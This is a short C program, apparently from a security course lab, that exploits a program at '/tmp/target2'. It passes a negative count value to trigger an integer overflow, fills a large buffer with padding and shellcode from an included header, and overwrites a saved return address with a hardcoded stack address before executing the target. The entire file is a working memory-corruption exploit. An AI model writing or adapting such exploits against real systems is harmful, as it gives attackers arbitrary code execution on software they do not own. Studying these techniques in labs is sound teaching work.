#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode.h"

#define TARGET "/tmp/target2"

int main(void)
{
	int bufsize = 28736; 
	char arg1[bufsize]; 
	char *args[] = { TARGET, arg1, NULL };
	char *env[] = { NULL };
	int target = 0xbeff1d58; 
	char count[12] = "-2147482750,"; 

	memset(arg1, 'A', bufsize);
	memcpy(arg1, count, 12);
	memcpy(arg1+12, shellcode, strlen(shellcode));
	*((int *) (arg1 + 28720)) = target;
	if (0 > execve(TARGET, args, env))
		fprintf(stderr, "execve failed.\n");

	return 0;
}